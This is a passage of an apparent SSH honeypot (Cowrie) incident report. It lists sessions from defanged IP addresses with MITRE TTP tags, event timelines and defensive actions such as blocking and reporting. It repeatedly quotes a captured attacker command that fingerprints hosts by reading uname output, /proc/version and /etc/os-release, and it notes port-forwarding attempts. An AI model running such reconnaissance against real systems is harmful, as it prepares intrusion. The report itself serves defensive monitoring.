| **Last Seen** | 2026-07-09 13:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:05:36` | `cowrie.session.connect` |
| `2026-07-09 13:05:37` | `cowrie.client.version` |
| `2026-07-09 13:05:37` | `cowrie.client.kex` |
| `2026-07-09 13:05:38` | `cowrie.login.success` |
| `2026-07-09 13:05:39` | `cowrie.session.params` |
| `2026-07-09 13:05:39` | `cowrie.command.input` |
| `2026-07-09 13:05:39` | `cowrie.command.input` |
| `2026-07-09 13:05:39` | `cowrie.command.input` |
| `2026-07-09 13:05:39` | `cowrie.command.input` |
| `2026-07-09 13:05:39` | `cowrie.command.input` |
| `2026-07-09 13:05:40` | `cowrie.command.success` |
| `2026-07-09 13:05:40` | `cowrie.command.input` |
| `2026-07-09 13:05:40` | `cowrie.command.input` |
| `2026-07-09 13:05:40` | `cowrie.command.input` |
| `2026-07-09 13:05:40` | `cowrie.command.input` |
| `2026-07-09 13:05:40` | `cowrie.log.closed` |
| `2026-07-09 13:05:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad61c678377d

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]8` |
| **First Seen** | 2026-07-09 13:07 |
| **Last Seen** | 2026-07-09 13:07 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:07:00` | `cowrie.session.connect` |
| `2026-07-09 13:07:01` | `cowrie.client.version` |
| `2026-07-09 13:07:01` | `cowrie.client.kex` |
| `2026-07-09 13:07:04` | `cowrie.login.success` |
| `2026-07-09 13:07:05` | `cowrie.direct-tcpip.request` |
| `2026-07-09 13:07:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]8` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]8` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2722ad5c6391

| Field | Detail |
|---|---|
| **Source IP** | `2.229.200[.]226` |
| **First Seen** | 2026-07-09 13:07 |
| **Last Seen** | 2026-07-09 13:07 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:07:10` | `cowrie.session.connect` |
| `2026-07-09 13:07:11` | `cowrie.client.version` |
| `2026-07-09 13:07:11` | `cowrie.client.kex` |
| `2026-07-09 13:07:11` | `cowrie.login.success` |
| `2026-07-09 13:07:12` | `cowrie.direct-tcpip.request` |
| `2026-07-09 13:07:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.229.200[.]226` to AbuseIPDB if not already reported
- [ ] Block `2.229.200[.]226` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36fcc6fb0bf0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 13:07 |
| **Last Seen** | 2026-07-09 13:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:07:49` | `cowrie.session.connect` |
| `2026-07-09 13:07:50` | `cowrie.client.version` |
| `2026-07-09 13:07:50` | `cowrie.client.kex` |
| `2026-07-09 13:07:51` | `cowrie.login.success` |
| `2026-07-09 13:07:52` | `cowrie.session.params` |
| `2026-07-09 13:07:52` | `cowrie.command.input` |
| `2026-07-09 13:07:52` | `cowrie.command.input` |
| `2026-07-09 13:07:52` | `cowrie.command.input` |
| `2026-07-09 13:07:52` | `cowrie.command.input` |
| `2026-07-09 13:07:52` | `cowrie.command.input` |
| `2026-07-09 13:07:52` | `cowrie.command.success` |
| `2026-07-09 13:07:52` | `cowrie.command.input` |
| `2026-07-09 13:07:52` | `cowrie.command.input` |
| `2026-07-09 13:07:52` | `cowrie.command.input` |
| `2026-07-09 13:07:52` | `cowrie.command.input` |
| `2026-07-09 13:07:53` | `cowrie.log.closed` |
| `2026-07-09 13:07:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e2db80d24b6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 13:10 |
| **Last Seen** | 2026-07-09 13:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:10:06` | `cowrie.session.connect` |
| `2026-07-09 13:10:06` | `cowrie.client.version` |
| `2026-07-09 13:10:06` | `cowrie.client.kex` |
| `2026-07-09 13:10:08` | `cowrie.login.success` |
| `2026-07-09 13:10:09` | `cowrie.session.params` |
| `2026-07-09 13:10:09` | `cowrie.command.input` |
| `2026-07-09 13:10:09` | `cowrie.command.input` |
| `2026-07-09 13:10:09` | `cowrie.command.input` |
| `2026-07-09 13:10:09` | `cowrie.command.input` |
| `2026-07-09 13:10:09` | `cowrie.command.input` |
| `2026-07-09 13:10:09` | `cowrie.command.success` |
| `2026-07-09 13:10:09` | `cowrie.command.input` |
| `2026-07-09 13:10:09` | `cowrie.command.input` |
| `2026-07-09 13:10:09` | `cowrie.command.input` |
| `2026-07-09 13:10:09` | `cowrie.command.input` |
| `2026-07-09 13:10:09` | `cowrie.log.closed` |
| `2026-07-09 13:10:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be35adf7423d

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-09 13:11 |
| **Last Seen** | 2026-07-09 13:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:11:43` | `cowrie.session.connect` |
| `2026-07-09 13:11:43` | `cowrie.client.version` |
| `2026-07-09 13:11:43` | `cowrie.client.kex` |
| `2026-07-09 13:11:44` | `cowrie.login.success` |
| `2026-07-09 13:11:44` | `cowrie.direct-tcpip.request` |
| `2026-07-09 13:11:44` | `cowrie.direct-tcpip.data` |
| `2026-07-09 13:11:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f526cd3df1e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 13:12 |
| **Last Seen** | 2026-07-09 13:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:12:20` | `cowrie.session.connect` |
| `2026-07-09 13:12:21` | `cowrie.client.version` |
| `2026-07-09 13:12:21` | `cowrie.client.kex` |
| `2026-07-09 13:12:23` | `cowrie.login.success` |
| `2026-07-09 13:12:24` | `cowrie.session.params` |
| `2026-07-09 13:12:24` | `cowrie.command.input` |
| `2026-07-09 13:12:24` | `cowrie.command.input` |
| `2026-07-09 13:12:24` | `cowrie.command.input` |
| `2026-07-09 13:12:24` | `cowrie.command.input` |
| `2026-07-09 13:12:24` | `cowrie.command.input` |
| `2026-07-09 13:12:24` | `cowrie.command.success` |
| `2026-07-09 13:12:24` | `cowrie.command.input` |
| `2026-07-09 13:12:24` | `cowrie.command.input` |
| `2026-07-09 13:12:24` | `cowrie.command.input` |
| `2026-07-09 13:12:24` | `cowrie.command.input` |
| `2026-07-09 13:12:25` | `cowrie.log.closed` |
| `2026-07-09 13:12:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07620b267b48

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 13:13 |
| **Last Seen** | 2026-07-09 13:13 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:13:21` | `cowrie.session.connect` |
| `2026-07-09 13:13:23` | `cowrie.client.version` |
| `2026-07-09 13:13:23` | `cowrie.client.kex` |
| `2026-07-09 13:13:27` | `cowrie.login.success` |
| `2026-07-09 13:13:31` | `cowrie.session.params` |
| `2026-07-09 13:13:31` | `cowrie.command.input` |
| `2026-07-09 13:13:32` | `cowrie.log.closed` |
| `2026-07-09 13:13:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-775492ac88f9

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-09 13:13 |
| **Last Seen** | 2026-07-09 13:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:13:59` | `cowrie.session.connect` |
| `2026-07-09 13:13:59` | `cowrie.client.version` |
| `2026-07-09 13:13:59` | `cowrie.client.kex` |
| `2026-07-09 13:13:59` | `cowrie.login.success` |
| `2026-07-09 13:14:00` | `cowrie.session.params` |
| `2026-07-09 13:14:00` | `cowrie.command.input` |
| `2026-07-09 13:14:00` | `cowrie.log.closed` |
| `2026-07-09 13:14:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a8d67c1e9ad

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 13:14 |
| **Last Seen** | 2026-07-09 13:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:14:33` | `cowrie.session.connect` |
| `2026-07-09 13:14:34` | `cowrie.client.version` |
| `2026-07-09 13:14:34` | `cowrie.client.kex` |
| `2026-07-09 13:14:35` | `cowrie.login.success` |
| `2026-07-09 13:14:37` | `cowrie.session.params` |
| `2026-07-09 13:14:37` | `cowrie.command.input` |
| `2026-07-09 13:14:37` | `cowrie.command.input` |
| `2026-07-09 13:14:37` | `cowrie.command.input` |
| `2026-07-09 13:14:37` | `cowrie.command.input` |
| `2026-07-09 13:14:37` | `cowrie.command.input` |
| `2026-07-09 13:14:37` | `cowrie.command.success` |
| `2026-07-09 13:14:37` | `cowrie.command.input` |
| `2026-07-09 13:14:37` | `cowrie.command.input` |
| `2026-07-09 13:14:37` | `cowrie.command.input` |
| `2026-07-09 13:14:37` | `cowrie.command.input` |
| `2026-07-09 13:14:37` | `cowrie.log.closed` |
| `2026-07-09 13:14:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5fa9f471308

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 13:16 |
| **Last Seen** | 2026-07-09 13:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:16:56` | `cowrie.session.connect` |
| `2026-07-09 13:16:56` | `cowrie.client.version` |
| `2026-07-09 13:16:56` | `cowrie.client.kex` |
| `2026-07-09 13:16:57` | `cowrie.login.success` |
| `2026-07-09 13:16:58` | `cowrie.session.params` |
| `2026-07-09 13:16:58` | `cowrie.command.input` |
| `2026-07-09 13:16:58` | `cowrie.command.input` |
| `2026-07-09 13:16:58` | `cowrie.command.input` |
| `2026-07-09 13:16:58` | `cowrie.command.input` |
| `2026-07-09 13:16:58` | `cowrie.command.input` |
| `2026-07-09 13:16:58` | `cowrie.command.success` |
| `2026-07-09 13:16:58` | `cowrie.command.input` |
| `2026-07-09 13:16:58` | `cowrie.command.input` |
| `2026-07-09 13:16:58` | `cowrie.command.input` |
| `2026-07-09 13:16:58` | `cowrie.command.input` |
| `2026-07-09 13:16:59` | `cowrie.log.closed` |
| `2026-07-09 13:16:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32f247cc8a72

| Field | Detail |
|---|---|
| **Source IP** | `121.128.84[.]224` |
| **First Seen** | 2026-07-09 13:18 |
| **Last Seen** | 2026-07-09 13:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:18:51` | `cowrie.session.connect` |
| `2026-07-09 13:18:52` | `cowrie.client.version` |
| `2026-07-09 13:18:52` | `cowrie.client.kex` |
| `2026-07-09 13:18:54` | `cowrie.login.success` |
| `2026-07-09 13:18:54` | `cowrie.direct-tcpip.request` |
| `2026-07-09 13:18:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.128.84[.]224` to AbuseIPDB if not already reported
- [ ] Block `121.128.84[.]224` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33cc5a1becf2

| Field | Detail |
|---|---|
| **Source IP** | `122.160.142[.]194` |
| **First Seen** | 2026-07-09 13:18 |
| **Last Seen** | 2026-07-09 13:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:18:59` | `cowrie.session.connect` |
| `2026-07-09 13:19:00` | `cowrie.client.version` |
| `2026-07-09 13:19:00` | `cowrie.client.kex` |
| `2026-07-09 13:19:02` | `cowrie.login.success` |
| `2026-07-09 13:19:03` | `cowrie.direct-tcpip.request` |
| `2026-07-09 13:19:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.160.142[.]194` to AbuseIPDB if not already reported
- [ ] Block `122.160.142[.]194` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef6d0e5c7a6e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 13:19 |
| **Last Seen** | 2026-07-09 13:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:19:24` | `cowrie.session.connect` |
| `2026-07-09 13:19:24` | `cowrie.client.version` |
| `2026-07-09 13:19:24` | `cowrie.client.kex` |
| `2026-07-09 13:19:25` | `cowrie.login.success` |
| `2026-07-09 13:19:26` | `cowrie.session.params` |
| `2026-07-09 13:19:26` | `cowrie.command.input` |
| `2026-07-09 13:19:26` | `cowrie.command.input` |
| `2026-07-09 13:19:26` | `cowrie.command.input` |
| `2026-07-09 13:19:26` | `cowrie.command.input` |
| `2026-07-09 13:19:26` | `cowrie.command.input` |
| `2026-07-09 13:19:26` | `cowrie.command.success` |
| `2026-07-09 13:19:26` | `cowrie.command.input` |
| `2026-07-09 13:19:26` | `cowrie.command.input` |
| `2026-07-09 13:19:26` | `cowrie.command.input` |
| `2026-07-09 13:19:26` | `cowrie.command.input` |
| `2026-07-09 13:19:26` | `cowrie.log.closed` |
| `2026-07-09 13:19:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5b8e6bcc3cd

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-09 13:21 |
| **Last Seen** | 2026-07-09 13:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:21:13` | `cowrie.session.connect` |
| `2026-07-09 13:21:13` | `cowrie.client.version` |
| `2026-07-09 13:21:13` | `cowrie.client.kex` |
| `2026-07-09 13:21:13` | `cowrie.login.success` |
| `2026-07-09 13:21:14` | `cowrie.direct-tcpip.request` |
| `2026-07-09 13:21:14` | `cowrie.direct-tcpip.ja4` |
| `2026-07-09 13:21:14` | `cowrie.direct-tcpip.data` |
| `2026-07-09 13:21:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff8d1e8b087b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 13:21 |
| **Last Seen** | 2026-07-09 13:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:21:40` | `cowrie.session.connect` |
| `2026-07-09 13:21:40` | `cowrie.client.version` |
| `2026-07-09 13:21:40` | `cowrie.client.kex` |
| `2026-07-09 13:21:41` | `cowrie.login.success` |
| `2026-07-09 13:21:42` | `cowrie.session.params` |
| `2026-07-09 13:21:42` | `cowrie.command.input` |
| `2026-07-09 13:21:42` | `cowrie.command.input` |
| `2026-07-09 13:21:42` | `cowrie.command.input` |
| `2026-07-09 13:21:42` | `cowrie.command.input` |
| `2026-07-09 13:21:42` | `cowrie.command.input` |
| `2026-07-09 13:21:42` | `cowrie.command.success` |
| `2026-07-09 13:21:42` | `cowrie.command.input` |
| `2026-07-09 13:21:42` | `cowrie.command.input` |
| `2026-07-09 13:21:42` | `cowrie.command.input` |
| `2026-07-09 13:21:42` | `cowrie.command.input` |
| `2026-07-09 13:21:42` | `cowrie.log.closed` |
| `2026-07-09 13:21:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7dea3039922

| Field | Detail |
|---|---|
| **Source IP** | `177.72.87[.]7` |
| **First Seen** | 2026-07-09 13:22 |
| **Last Seen** | 2026-07-09 13:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:22:34` | `cowrie.session.connect` |
| `2026-07-09 13:22:35` | `cowrie.client.version` |
| `2026-07-09 13:22:35` | `cowrie.client.kex` |
| `2026-07-09 13:22:37` | `cowrie.login.success` |
